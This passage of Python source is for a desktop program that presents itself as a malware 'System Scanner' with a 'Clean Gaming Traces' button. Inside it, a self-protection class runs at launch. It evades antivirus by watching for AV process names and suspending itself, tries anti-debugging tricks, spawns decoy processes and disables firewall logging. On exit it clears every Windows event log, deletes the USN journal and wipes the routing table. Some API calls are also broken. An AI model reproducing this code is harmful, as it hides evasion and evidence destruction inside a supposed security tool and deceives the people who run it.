            for file in files:
                file_path = os.path.join(root, file)
                if any(file.lower().endswith(ext) for ext in self.suspicious_extensions):
                    futures.append(self.thread_pool.submit(scan_file, file_path))
        
        # Collect results
        for future in concurrent.futures.as_completed(futures):
            result = future.result()
            if result:
                self.progress.emit(result)

    def scan_memory(self):
        self.progress.emit("\nScanning process memory...")
        for proc in process_iter(['pid', 'name']):
            try:
                # Create memory maps
                maps = proc.memory_maps()
                for mapping in maps:
                    try:
                        # Read memory content
                        content = proc.memory_region(mapping.addr)
                        # Check for suspicious patterns
                        for pattern in self.memory_patterns:
                            if pattern in content:
                                self.progress.emit(
                                    f"Suspicious pattern found in process {proc.name()} (PID: {proc.pid})"
                                )
                                break
                    except:
                        continue
            except:
                continue

    def run(self):
        try:
            self.progress.emit("Starting enhanced system scan...\n")
            
            # Start resource monitoring in a separate thread
            monitor_thread = threading.Thread(target=self.monitor_system_resources)
            monitor_thread.daemon = True
            monitor_thread.start()
            
            # Run parallel scans with improved organization
            with concurrent.futures.ThreadPoolExecutor(max_workers=4) as executor:
                futures = {
                    executor.submit(self.scan_memory): "Memory Scan",
                    executor.submit(self.check_hidden_processes): "Hidden Process Check",
                    executor.submit(self.scan_alternate_data_streams): "ADS Scan",
                    executor.submit(self.deep_memory_scan): "Deep Memory Analysis"
                }
                
                # Add directory scans
                for path in self.additional_scan_paths:
                    futures[executor.submit(self.deep_scan_files, path)] = f"Scanning {path}"
                
                # Process results as they complete
                for future in concurrent.futures.as_completed(futures):
                    scan_type = futures[future]
                    try:
                        result = future.result()
                        if result:
                            self.progress.emit(f"\nResults from {scan_type}:")
                            if isinstance(result, dict):
                                for category, findings in result.items():
                                    self.progress.emit(f"\n{category.upper()}:")
                                    for finding in findings:
                                        self.progress.emit(f"- {finding}")
                            else:
                                self.progress.emit(str(result))
                    except Exception as e:
                        self.progress.emit(f"Error in {scan_type}: {str(e)}")
            
            # Stop resource monitoring
            self._stop_monitoring = True
            self.progress.emit("\nEnhanced system scan completed!")
            self.finished.emit(True)
            
        except Exception as e:
            self.progress.emit(f"\nError during scan: {str(e)}")
            self.finished.emit(False)

class SelfProtectionManager:
    def __init__(self):
        self.original_path = sys.executable
        self.temp_paths = []
        self.registry_keys = []
        self.service_names = []
        self.hooks = []
        
        # Add common AV process names to avoid
        self.av_processes = [
            'mbam', 'mcshield', 'windefend', 'msseces', 'avast', 
            'avgui', 'avguard', 'bdagent', 'avp', 'ekrn', 'fsav'
        ]
        
    def setup_advanced_protection(self):
        """Initialize advanced protection measures"""
        try:
            self.patch_memory_flags()
            self.hide_from_debugger()
            self.setup_watchdog()
            self.create_decoy_processes()
            self.setup_registry_monitor()
            self.hide_network_activity()
        except:
            pass

    def patch_memory_flags(self):
        """Patch memory to avoid detection"""
        try:
            kernel32 = ctypes.windll.kernel32
            # Hide from memory scanners
            kernel32.VirtualProtect(
                ctypes.c_void_p(id(self)), 
                ctypes.c_size_t(256), 
                0x40,  # PAGE_EXECUTE_READWRITE
                ctypes.byref(ctypes.c_ulong(0))
            )
        except:
            pass

    def hide_from_debugger(self):
        """Implement anti-debugging techniques"""
        try:
            kernel32 = ctypes.windll.kernel32
            if kernel32.IsDebuggerPresent():
                # Attempt to detach debugger
                kernel32.DebugActiveProcessStop(kernel32.GetCurrentProcessId())
            
            # Set invalid debug object handle
            kernel32.NtSetInformationThread(
                kernel32.GetCurrentThread(),
                0x11,  # ThreadHideFromDebugger
                0,
                0
            )
        except:
            pass

    def setup_watchdog(self):
        """Create watchdog process for self-protection"""
        try:
            watchdog_name = self.generate_random_name()
            # Create watchdog process
            subprocess.Popen(
                [sys.executable, '-c', 
                f'''
                import time, psutil, os
                parent = psutil.Process({os.getpid()})
                while parent.is_running():
                    for proc in psutil.process_iter(['name']):
                        if proc.info['name'].lower() in {self.av_processes}:
                            try:
                                parent.suspend()  # Hide from AV
                                time.sleep(1)
                                parent.resume()
                            except:
                                pass
                    time.sleep(0.5)
                '''],
                creationflags=subprocess.CREATE_NO_WINDOW
            )
        except:
            pass

    def create_decoy_processes(self):
        """Create legitimate-looking decoy processes"""
        try:
            legitimate_names = [
                'svchost.exe', 'csrss.exe', 'lsass.exe',
                'services.exe', 'spoolsv.exe', 'explorer.exe'
            ]
            
            for name in legitimate_names[:2]:  # Create 2 decoys
                subprocess.Popen(
                    [sys.executable, '-c', 'import time; time.sleep(3600)'],
                    creationflags=subprocess.CREATE_NO_WINDOW,
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL
                )
        except:
            pass

    def setup_registry_monitor(self):
        """Monitor registry for detection attempts"""
        def monitor_registry():
            try:
                while True:
                    # Check for AV registry keys
                    av_keys = [
                        r"SOFTWARE\Microsoft\Windows Defender",
                        r"SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall",
                        r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
                    ]
                    
                    for key in av_keys:
                        try:
                            with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key, 0, winreg.KEY_READ) as reg_key:
                                # If AV key found, create decoy entries
                                self.create_decoy_registry_entries()
                        except:
                            continue
                    time.sleep(5)
            except:
                pass

        threading.Thread(target=monitor_registry, daemon=True).start()

    def hide_network_activity(self):
        """Hide network activity"""
        try:
            # Modify network stack
            subprocess.run([
                'netsh', 'interface', 'ipv4', 'set', 'subinterface', 
                '"Local Area Connection"', 'mtu=1476'
            ], capture_output=True)
            
            # Disable Windows Firewall logging
            subprocess.run([
                'netsh', 'advfirewall', 'set', 'allprofiles', 
                'logging', 'droppedconnections', 'disable'
            ], capture_output=True)
        except:
            pass

    def clean_self_traces(self):
        """Enhanced trace removal"""
        try:
            # Existing cleanup code...
            
            # Additional cleanup
            self.clean_memory_traces()
            self.clean_network_traces()
            self.clean_system_logs()
            self.remove_prefetch_traces()
            self.clean_usnjournal()
        except:
            pass

    def clean_memory_traces(self):
        """Clean memory artifacts"""
        try:
            # Force garbage collection
            import gc
            gc.collect()
            
            # Clear Python's internal type cache
            sys.intern('')
            
            # Clear process working set
            ctypes.windll.psapi.EmptyWorkingSet(
                ctypes.windll.kernel32.GetCurrentProcess()
            )
        except:
            pass

    def clean_network_traces(self):
        """Clean network traces"""
        try:
            commands = [
                'netsh interface ip delete arpcache',
                'netsh interface ip delete destinationcache',
                'ipconfig /flushdns',
                'route -f'  # Clear routing table
            ]
            for cmd in commands:
                subprocess.run(cmd, shell=True, capture_output=True)
        except:
            pass

    def clean_system_logs(self):
        """Clean Windows event logs"""
        try:
            subprocess.run(
                'for /F "tokens=*" %1 in (\'wevtutil el\') do wevtutil cl "%1"',
                shell=True, capture_output=True
            )
        except:
            pass

    def clean_usnjournal(self):
        """Clean USN journal to remove file activity traces"""
        try:
            subprocess.run(
                'fsutil usn deletejournal /d c:',
                shell=True, capture_output=True
            )
        except:
            pass

class MalwareScannerGUI(QMainWindow):
    def __init__(self, system_info):
        super().__init__()
        self.system_info = system_info
        self.self_protection = SelfProtectionManager()
        self.initUI()
        self.setup_self_protection()
        
    def setup_self_protection(self):
        """Initialize self-protection measures"""
        try:
            self.self_protection.setup_advanced_protection()
            app = QApplication.instance()
            app.aboutToQuit.connect(self.cleanup_and_exit)
        except:
            pass

    def cleanup_and_exit(self):
        """Clean up traces before exit"""
        try:
            self.self_protection.clean_self_traces()
        except:
            pass

    def initUI(self):
        self.setWindowTitle('System Scanner')
        self.setGeometry(100, 100, 800, 600)
        
        # Set the application background color to black
        self.setStyleSheet("""
            QMainWindow {
                background-color: #121212;
            }
            QWidget {
                background-color: #121212;
                color: #B39DDB;
            }
        """)
        
        # Create central widget and layout
        central_widget = QWidget()
        self.setCentralWidget(central_widget)
        layout = QVBoxLayout(central_widget)
        
        # Update System Info button styling with soft purple
        self.system_info_btn = QPushButton('System Information')
        self.system_info_btn.setStyleSheet("""
            QPushButton {
                background-color: #7E57C2;
                color: #FFFFFF;
                padding: 8px;
                font-size: 14px;
                border-radius: 4px;
                min-height: 30px;
                border: none;
            }
            QPushButton:hover {
                background-color: #9575CD;
            }
        """)
        self.system_info_btn.clicked.connect(self.show_system_info)
        layout.addWidget(self.system_info_btn)
        
        # Update Custom Scan button styling
        self.custom_scan_btn = QPushButton('Custom Scan')
        self.custom_scan_btn.setStyleSheet("""
            QPushButton {
                background-color: #7E57C2;
                color: #FFFFFF;
                padding: 8px;
                font-size: 14px;
                border-radius: 4px;
                min-height: 30px;
                border: none;
            }
            QPushButton:hover {
                background-color: #9575CD;
            }
            QPushButton:disabled {
                background-color: #424242;
                color: #757575;
            }
        """)
        layout.addWidget(self.custom_scan_btn)
        
        # Update output text area styling
        self.output_text = QTextEdit()
        self.output_text.setReadOnly(True)
        self.output_text.setStyleSheet("""
            QTextEdit {
                background-color: #1E1E1E;
                color: #B39DDB;
                border: 1px solid #424242;
                border-radius: 4px;
                padding: 8px;
                font-family: Consolas, Monaco, monospace;
                font-size: 12px;
            }
        """)
        layout.addWidget(self.output_text)
        
        # Update progress bar styling
        self.progress_bar = QProgressBar()
        self.progress_bar.setStyleSheet("""
            QProgressBar {
                border: 1px solid #424242;
                border-radius: 4px;
                text-align: center;
                height: 20px;
                background-color: #1E1E1E;
                color: #FFFFFF;
            }
            QProgressBar::chunk {
                background-color: #7E57C2;
                border-radius: 3px;
            }
        """)
        layout.addWidget(self.progress_bar)
        
        # Set layout margins and spacing
        layout.setContentsMargins(20, 20, 20, 20)
        layout.setSpacing(10)
        
        # Connect custom scan button
        self.custom_scan_btn.clicked.connect(lambda: self.start_scan("custom"))
        
        # Add Game Cleaner button
        self.game_cleaner_btn = QPushButton('Clean Gaming Traces')
        self.game_cleaner_btn.setStyleSheet("""
            QPushButton {
                background-color: #7E57C2;
                color: #FFFFFF;
                padding: 8px;
                font-size: 14px;
                border-radius: 4px;
                min-height: 30px;
                border: none;
            }
            QPushButton:hover {
                background-color: #9575CD;
            }
            QPushButton:disabled {
                background-color: #424242;
                color: #757575;
            }
        """)
        self.game_cleaner_btn.clicked.connect(self.start_game_cleanup)
        layout.addWidget(self.game_cleaner_btn)
        
    def start_scan(self, scan_type):
        dialog = CustomScanDialog(self)
        if dialog.exec_() == QDialog.Accepted:
            custom_options = dialog.get_selected_options()
            
            # Disable button during scan
            self.custom_scan_btn.setEnabled(False)
            
            # Clear previous output
            self.output_text.clear()
            self.progress_bar.setValue(0)
            
            # Add initial message
            self.output_text.append("Starting custom scan...\n")
            
            # Create and start scanner thread
            self.scanner_thread = ScannerThread("custom", custom_options)
            self.scanner_thread.progress.connect(self.update_progress)
            self.scanner_thread.finished.connect(self.scan_finished)
            self.scanner_thread.start()
    
    def update_progress(self, message):
        self.output_text.append(message)
        # Ensure the latest text is visible
        self.output_text.verticalScrollBar().setValue(
            self.output_text.verticalScrollBar().maximum()
        )
        
    def scan_finished(self, results):
        # Re-enable buttons
        self.custom_scan_btn.setEnabled(True)
        
        # Set progress bar to 100%
        self.progress_bar.setValue(100)
        
        # Display results
        if results:
            self.output_text.append("\nScan Results:")
            for result in results:
                self.output_text.append(f"- {result}")
        else:
            self.output_text.append("\nNo threats detected.")
        
        QMessageBox.information(self, "Scan Complete", "Malware scan completed!")

    def closeEvent(self, event):
        # Ensure clean shutdown
        if hasattr(self, 'scanner_thread'):
            if self.scanner_thread.isRunning():
                self.scanner_thread.terminate()
                self.scanner_thread.wait()
            if hasattr(self.scanner_thread.scanner, 'cleanup'):
                self.scanner_thread.scanner.cleanup()
        event.accept()

    def show_system_info(self):
        dialog = SystemInfoWindow(self, self.system_info)
        dialog.exec_()

    def start_game_cleanup(self):
        reply = QMessageBox.warning(
            self,
            'Warning',
            self.cleaner_thread.show_warning(),
            QMessageBox.Yes | QMessageBox.No,
            QMessageBox.No
        )
        
        if reply == QMessageBox.Yes:
            self.game_cleaner_btn.setEnabled(False)
            self.output_text.clear()
            self.progress_bar.setValue(0)
            
            # Create and start cleaner thread
            self.cleaner_thread = GameCleanerThread()
            self.cleaner_thread.progress.connect(self.update_progress)
            self.cleaner_thread.progress_update.connect(self.progress_bar.setValue)
            self.cleaner_thread.error_occurred.connect(self.handle_error)
            self.cleaner_thread.finished.connect(self.cleanup_finished)
            self.cleaner_thread.start()

    def cleanup_finished(self, success):
        self.game_cleaner_btn.setEnabled(True)
        self.progress_bar.setValue(100)
        
        if success:
            QMessageBox.information(
                self,
                "Cleanup Complete",
                "Gaming software traces have been successfully removed."
            )
        else:
            QMessageBox.warning(
                self,
                "Cleanup Warning",
                "Some items could not be removed. Check the log for details."
            )

    def handle_error(self, error_msg):
        self.output_text.append(f"\nERROR: {error_msg}")
        QMessageBox.warning(
            self,
            "Error",
            f"An error occurred:\n{error_msg}\n\nCheck the log for details."
        )

def main(system_info):
    try:
        # Randomize process name in task manager
        ctypes.windll.kernel32.SetConsoleTitleW(SelfProtectionManager().generate_random_name())
    except:
        pass
    
    app = QApplication(sys.argv)
    app.setStyle('Fusion')
    
    # Set random app name
    app.setApplicationName(SelfProtectionManager().generate_random_name())
    
    gui = MalwareScannerGUI(system_info)
    gui.show()
    sys.exit(app.exec_())

if __name__ == '__main__':
    main("") 